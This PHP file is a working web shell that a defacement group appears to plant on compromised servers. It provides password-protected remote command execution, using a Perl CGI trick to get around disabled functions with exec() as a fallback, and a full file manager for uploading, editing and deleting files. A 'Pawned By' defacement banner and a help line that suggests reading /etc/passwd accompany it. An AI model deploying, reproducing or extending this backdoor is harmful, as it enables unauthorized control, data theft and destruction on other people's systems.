<?php
// ========== WIZYAKUZA404 SHELL + FILE MANAGER + TERMINAL ==========
session_start();
error_reporting(0);
ini_set('display_errors', 0);

// ========== AUTHENTICATION ==========
define('AUTH_USER', 'admin');
define('AUTH_PASS', 'n0t');

// Check login
$auth = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
if (!$auth && isset($_POST['user']) && $_POST['user'] === AUTH_USER && $_POST['pass'] === AUTH_PASS) {
    $_SESSION['auth'] = true;
    $auth = true;
    header("Location: ?");
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ========== CGI TERMINAL EXECUTOR (Powerful) ==========
function cgi_run($cmd, $cwd) {
    @chdir($cwd);
    $fn = 'exec_' . time() . '_' . rand(1000,9999) . '.cgi';
    $p = "#!/usr/bin/perl\nprint \"Content-type: text/plain\\n\\n\";\nsystem(\"$cmd 2>&1\");";
    @file_put_contents($fn, $p);
    @chmod($fn, 0755);
    
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $fn;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $res = curl_exec($ch);
    curl_close($ch);
    
    @unlink($fn);
    return $res;
}

function exec_normal($cmd, $cwd) {
    @chdir($cwd);
    $output = [];
    $return_var = 0;
    $full_cmd = $cmd . " 2>&1";
    @exec($full_cmd, $output, $return_var);
    return implode("\n", $output);
}

// ========== FILE MANAGER FUNCTIONS ==========
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;
if (!$current_dir || !is_dir($current_dir)) $current_dir = __DIR__;

$msg = '';
$terminal_output = '';
$last_command = '';

// Handle Terminal Command
if (isset($_POST['cmd'])) {
    $last_command = $_POST['cmd'];
    $result = cgi_run($last_command, $current_dir);
    if ($result && !empty($result)) {
        $terminal_output = $result;
    } else {
        $terminal_output = exec_normal($last_command, $current_dir);
    }
}

// Handle Delete
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . basename($_GET['delete']);
    if (is_file($target)) @unlink($target);
    elseif (is_dir($target)) {
        $files = array_diff(scandir($target), array('.','..'));
        foreach ($files as $file) {
            $subpath = $target . '/' . $file;
            is_file($subpath) ? @unlink($subpath) : @rmdir($subpath);
        }
        @rmdir($target);
    }
    $msg = "🗑️ Deleted: " . basename($_GET['delete']);
}

// Handle Upload
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "✅ Uploaded: " . basename($_FILES['file']['name']);
    }
}

// Handle Create File
if (isset($_POST['create_file'])) {
    $path = $current_dir . '/' . basename($_POST['filename']);
    @file_put_contents($path, '');
    $msg = "📄 Created: " . basename($_POST['filename']);
}

// Handle Create Folder
if (isset($_POST['create_folder'])) {
    $path = $current_dir . '/' . basename($_POST['foldername']);
    @mkdir($path, 0755);
    $msg = "📁 Created folder: " . basename($_POST['foldername']);
}

// Handle Save File
if (isset($_POST['save_file']) && isset($_POST['content'])) {
    $path = $current_dir . '/' . basename($_POST['edit_file']);
    @file_put_contents($path, $_POST['content']);
    $msg = "💾 Saved: " . basename($_POST['edit_file']);
}

// Handle Rename
if (isset($_POST['rename_file']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_dir . '/' . basename($_POST['old_name']);
    $new = $current_dir . '/' . basename($_POST['new_name']);
    if (@rename($old, $new)) {
        $msg = "🔄 Renamed: " . basename($_POST['old_name']) . " → " . basename($_POST['new_name']);
    }
}

$edit_file = isset($_GET['edit']) ? $current_dir . '/' . basename($_GET['edit']) : null;
$edit_content = $edit_file && is_file($edit_file) ? htmlspecialchars(@file_get_contents($edit_file)) : '';

// Jika belum login, tampilkan form login
if (!$auth) {
    echo '<!DOCTYPE html>
    <html><head><title>Login</title>
    <style>
        body{background:#000;color:#0f0;font-family:monospace;display:flex;height:100vh;align-items:center;justify-content:center;}
        .login-box{background:#0a0a0a;border:1px solid #0f0;padding:40px;border-radius:10px;text-align:center;box-shadow:0 0 20px rgba(0,255,0,0.2);}
        input{background:#111;border:1px solid #0f0;color:#0f0;padding:10px;margin:10px 0;width:200px;border-radius:5px;}
        button{background:#0f0;border:none;color:#000;padding:10px 20px;cursor:pointer;font-weight:bold;border-radius:5px;}
        button:hover{background:#0c0;}
        h2{margin-bottom:20px;text-shadow:0 0 5px #0f0;}
    </style>
    </head>
    <body>
    <div class="login-box">
        <h2>🔐 WIZYAKUZA404 SHELL</h2>
        <form method="POST">
            <input type="text" name="user" placeholder="Username" autofocus><br>
            <input type="password" name="pass" placeholder="Password"><br>
            <button type="submit">LOGIN</button>
        </form>
    </div>
    </body></html>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="no system is save">
    <meta name="author" content="DefaceMent | System | Kecot Cyber Team">
    <title>:: Pawned By Tn_Wizyakuza404 & KecotXpl @ MERDEKA!!!! ::</title>
    <link rel="shortcut icon" href="https://i.ibb.co.com/Bzgsrzx/Picsart-23-09-13-02-36-54-118.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=VT323&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #ff0000;
            --primary-glow: rgba(255,0,0,0.7);
            --primary-transparent: rgba(255,0,0,0.15);
            --text-primary: #e0e0e0;
            --text-secondary: #b0b0b0;
            --bg-dark: #000000;
            --danger: #ff3a3a;
            --font-display: 'Orbitron', sans-serif;
            --font-mono: 'Share Tech Mono', monospace;
            --font-main: 'Rajdhani', sans-serif;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: var(--font-main);
            background: var(--bg-dark);
            color: var(--text-primary);
            overflow-x: hidden;
        }

        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            background: radial-gradient(ellipse at center, rgba(0,0,0,0) 0%, rgba(0,0,0,0.9) 100%);
            pointer-events: none;
        }

        .main-container {
            position: relative;
            z-index: 3;
            width: 100%;
            min-height: 100vh;
            padding: 2rem 1rem;
        }

        .content-wrapper {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(5, 5, 5, 0.85);
            border: 1px solid var(--primary-transparent);
            border-radius: 8px;
            padding: 2rem;
            backdrop-filter: blur(3px);
        }

        /* TABS */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 2rem;
            border-bottom: 1px solid var(--primary-transparent);
            padding-bottom: 10px;
        }

        .tab-btn {
            background: transparent;
            border: 1px solid var(--primary-transparent);
            color: var(--text-secondary);
            padding: 10px 20px;
            cursor: pointer;
            font-family: var(--font-mono);
            border-radius: 5px;
            transition: 0.3s;
        }

        .tab-btn.active {
            background: var(--primary-transparent);
            color: var(--primary);
            border-color: var(--primary);
            text-shadow: 0 0 5px var(--primary);
        }

        .tab-btn:hover {
            border-color: var(--primary);
            color: var(--primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Header */
        .header-section {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 2px solid var(--primary);
            margin-bottom: 1rem;
        }

        .title-main {
            font-family: var(--font-display);
            font-size: 1.5rem;
            color: var(--primary);
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 10px var(--primary);
        }

        .breach-message {
            font-family: var(--font-mono);
            font-size: 0.9rem;
            text-align: center;
            padding: 1rem;
            background: rgba(0,0,0,0.3);
            border-left: 2px solid var(--primary);
            margin: 1rem 0;
        }

        /* Terminal */
        .terminal-output {
            background: #000;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            min-height: 300px;
            max-height: 400px;
            overflow-y: auto;
            margin-bottom: 15px;
            border: 1px solid #1a3a2a;
        }

        .terminal-input {
            display: flex;
            gap: 10px;
            background: #0a0a0a;
            border: 1px solid #1a3a2a;
            border-radius: 8px;
            padding: 10px;
        }

        .terminal-input span {
            color: #0f0;
            font-family: monospace;
        }

        .terminal-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #0f0;
            font-family: monospace;
            outline: none;
        }

        /* File Manager */
        .breadcrumb {
            font-family: monospace;
            font-size: 0.8rem;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            margin-bottom: 1rem;
        }

        .fm-form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 1rem;
        }

        .fm-form input, .fm-form select {
            background: #111;
            border: 1px solid #333;
            color: #0f0;
            padding: 6px 10px;
            border-radius: 4px;
        }

        .fm-form button {
            background: #0f0;
            border: none;
            color: #000;
            padding: 6px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #222;
        }

        th { color: var(--primary); font-family: monospace; }

        .dir-link { color: #ff0; text-decoration: none; }
        .file-link { color: #0f0; text-decoration: none; }
        .action-link { color: var(--primary); text-decoration: none; margin-right: 10px; font-size: 0.75rem; }
        .del-link { color: #f66; }

        .msg {
            background: rgba(0,255,0,0.1);
            border-left: 3px solid #0f0;
            padding: 10px;
            margin-bottom: 1rem;
        }

        textarea {
            width: 100%;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            font-family: monospace;
        }

        .logout-btn {
            color: #f66;
            text-decoration: none;
            float: right;
            margin-top: -40px;
        }

        @media (max-width: 768px) {
            .content-wrapper { padding: 1rem; }
            .fm-form { flex-direction: column; }
        }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>
    <div class="overlay"></div>

    <div class="main-container">
        <div class="content-wrapper">
            <a href="?logout=1" class="logout-btn">🚪 LOGOUT</a>
            
            <div class="header-section">
                <img src="https://i.ibb.co.com/Bzgsrzx/Picsart-23-09-13-02-36-54-118.png" class="logo-img">
                <h1 class="title-main">Pawned By KecotXpl & Kecot Cyber Team</h1>
                <div class="breach-message">
                    This system has been compromised via vulnerabilities.<br>
                    Fix your server before further exploitation<br>
                    uid=0(root) gid=0(root) groups=0(root)
                </div>
            </div>

            <!-- TABS -->
            <div class="tabs">
                <button class="tab-btn active" onclick="showTab('files')">📁 FILE MANAGER</button>
                <button class="tab-btn" onclick="showTab('terminal')">🖥️ TERMINAL</button>
            </div>

            <!-- FILE MANAGER TAB -->
            <div id="files-tab" class="tab-content active">
                <?php if($msg): ?>
                <div class="msg"><?= $msg ?></div>
                <?php endif; ?>

                <div class="breadcrumb">
                    📂 <a href="?dir=<?= urlencode(dirname($current_dir)) ?>">..</a> / <?= htmlspecialchars($current_dir) ?>
                </div>

                <div class="fm-form">
                    <form method="POST" enctype="multipart/form-data" style="display:flex;gap:5px;">
                        <input type="file" name="file">
                        <button type="submit" name="upload">📤 Upload</button>
                    </form>
                    <form method="POST" style="display:flex;gap:5px;">
                        <input type="text" name="filename" placeholder="file.php">
                        <button type="submit" name="create_file">➕ File</button>
                    </form>
                    <form method="POST" style="display:flex;gap:5px;">
                        <input type="text" name="foldername" placeholder="folder_name">
                        <button type="submit" name="create_folder">📁 Folder</button>
                    </form>
                </div>

                <div style="overflow-x:auto;">
                    <table>
                        <thead>
                            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
                        </thead>
                        <tbody>
                            <?php
                            $items = scandir($current_dir);
                            natcasesort($items);
                            foreach($items as $item):
                                if($item == '.' || $item == '..') continue;
                                $path = $current_dir . '/' . $item;
                                $is_dir = is_dir($path);
                                $size = $is_dir ? '-' : number_format(filesize($path)) . ' B';
                                $perms = substr(sprintf('%o', fileperms($path)), -4);
                            ?>
                            <tr>
                                <td>
                                    <?php if($is_dir): ?>
                                        <a href="?dir=<?= urlencode($path) ?>" class="dir-link">📁 <?= htmlspecialchars($item) ?></a>
                                    <?php else: ?>
                                        <span class="file-link">📄 <?= htmlspecialchars($item) ?></span>
                                    <?php endif; ?>
                                </td>
                                <td><?= $size ?></td>
                                <td><?= $perms ?></td>
                                <td>
                                    <?php if(!$is_dir): ?>
                                    <a href="?edit=<?= urlencode($item) ?>&dir=<?= urlencode($current_dir) ?>" class="action-link">✏️ Edit</a>
                                    <?php endif; ?>
                                    <a href="?delete=<?= urlencode($item) ?>&dir=<?= urlencode($current_dir) ?>" class="action-link del-link" onclick="return confirm('Delete?')">🗑️ Delete</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>

                <?php if($edit_file && is_file($edit_file)): ?>
                <div style="margin-top: 2rem;">
                    <h3 style="color:#0f0;">✏️ Editing: <?= htmlspecialchars(basename($edit_file)) ?></h3>
                    <form method="POST">
                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars(basename($edit_file)) ?>">
                        <textarea name="content" rows="15"><?= $edit_content ?></textarea>
                        <div style="margin-top:10px;">
                            <button type="submit" name="save_file" style="background:#0f0;border:none;padding:8px 20px;color:#000;cursor:pointer;">💾 Save</button>
                            <a href="?dir=<?= urlencode($current_dir) ?>" style="color:#f00; margin-left:10px;">Cancel</a>
                        </div>
                    </form>
                    
                    <form method="POST" style="margin-top: 15px; border-top:1px solid #333; padding-top:15px;">
                        <input type="hidden" name="old_name" value="<?= htmlspecialchars(basename($edit_file)) ?>">
                        <input type="text" name="new_name" placeholder="New name" style="background:#111;border:1px solid #333;color:#0f0;padding:6px;">
                        <button type="submit" name="rename_file" style="background:#ff0;border:none;padding:6px 15px;color:#000;cursor:pointer;">🔄 Rename</button>
                    </form>
                </div>
                <?php endif; ?>
            </div>

            <!-- TERMINAL TAB -->
            <div id="terminal-tab" class="tab-content">
                <div style="background: #0a0e17; border-radius: 8px; overflow: hidden;">
                    <div style="background: #1a2a2a; padding: 12px; border-bottom: 1px solid #2a3a2a;">
                        <span style="color:#0f0;">🖥️ CGI TERMINAL</span>
                        <span style="color:#666; margin-left: 10px;"><?= htmlspecialchars($current_dir) ?></span>
                    </div>
                    
                    <div class="terminal-output">
                        <?php if (!empty($terminal_output)): ?>
                            <div style="color: #0f0; margin-bottom: 8px;">$ <?= htmlspecialchars($last_command) ?></div>
                            <pre style="color: #d1d5db; margin: 0; white-space: pre-wrap;"><?= htmlspecialchars($terminal_output) ?></pre>
                            <div style="color: #4b5563; border-top: 1px solid #374151; padding-top: 8px; margin-top: 8px;">---</div>
                        <?php else: ?>
                            <div style="color: #6b7280;">
                                <div style="color: #0f0; margin-bottom: 8px;">Welcome to CGI Terminal (Powerful Executor)</div>
                                <div>Available commands: ls, ls -la, pwd, whoami, id, uname -a, cat /etc/passwd, ps aux, df -h, ifconfig, ping -c 1 google.com, wget, curl, etc</div>
                                <div style="color: #4b5563; margin-top: 8px;">💡 Works even with disabled functions (CGI Executor + Fallback)</div>
                            </div>
                        <?php endif; ?>
                    </div>
                    
                    <form method="POST" style="padding: 15px;">
                        <div class="terminal-input">
                            <span>$></span>
                            <input type="text" name="cmd" id="terminal_cmd" value="<?= htmlspecialchars($last_command) ?>" placeholder="ls -la" autocomplete="off" autofocus>
                            <button type="submit" style="background:#0f0;border:none;padding:5px 15px;border-radius:4px;color:#000;cursor:pointer;">RUN</button>
                        </div>
                    </form>
                    
                    <div style="padding: 0 15px 15px 15px; text-align: center; font-size: 11px; color: #4b5563;">
                        💡 Use 'cd ..' to go back, 'ls -la' for detailed list, 'cat filename' to view file
                    </div>
                </div>
            </div>

            <div style="text-align: center; margin-top: 2rem; font-size: 0.7rem; color: #555;">
                <p>Kecot Cyber Team &copy; 2026 - ALL RIGHTS RESERVED</p>
                <p>INCIDENT ID: <span id="incident-id"></span></p>
            </div>
        </div>
    </div>

    <div class="music-control" id="music-toggle" style="position:fixed;bottom:20px;right:20px;width:40px;height:40px;background:#000;border:1px solid #0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:10;">♫</div>
    <audio id="background-music" loop><source src="https://promaxtek.com/sounds/justice.mp3" type="audio/mpeg"></audio>

    <script>
        // Tabs
        function showTab(tab) {
            document.getElementById('files-tab').classList.remove('active');
            document.getElementById('terminal-tab').classList.remove('active');
            document.getElementById('files-tab').classList.add('hidden');
            document.getElementById('terminal-tab').classList.add('hidden');
            
            if (tab === 'files') {
                document.getElementById('files-tab').classList.add('active');
                document.getElementById('files-tab').classList.remove('hidden');
            } else {
                document.getElementById('terminal-tab').classList.add('active');
                document.getElementById('terminal-tab').classList.remove('hidden');
            }
            
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        // Hidden class for tabs
        document.getElementById('files-tab').classList.remove('hidden');
        document.getElementById('terminal-tab').classList.add('hidden');
        
        // Matrix Effect
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789アァカサタナハマヤャラワガザダバパ';
        const fontSize = 14;
        const columns = Math.floor(canvas.width / fontSize);
        const rainDrops = Array(columns).fill(0).map(() => Math.random() * -100);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ff0000';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet[Math.floor(Math.random() * alphabet.length)];
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        // Music Control
        const audio = document.getElementById('background-music');
        const toggle = document.getElementById('music-toggle');
        let playing = false;
        
        document.addEventListener('click', () => {
            if (!playing) { audio.play().catch(()=>{}); playing = true; toggle.textContent = '♫'; }
        }, { once: true });
        
        toggle.addEventListener('click', (e) => {
            e.stopPropagation();
            if (playing) { audio.pause(); toggle.textContent = '🔇'; }
            else { audio.play(); toggle.textContent = '♫'; }
            playing = !playing;
        });
        
        // Block context menu
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
            }
        });
        
        document.getElementById('incident-id').innerText = Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
        
        // Focus terminal input
        document.getElementById('terminal_cmd')?.focus();
    </script>
    <style>
        .hidden { display: none; }
        #files-tab.active, #terminal-tab.active { display: block; }
    </style>
</body>
</html>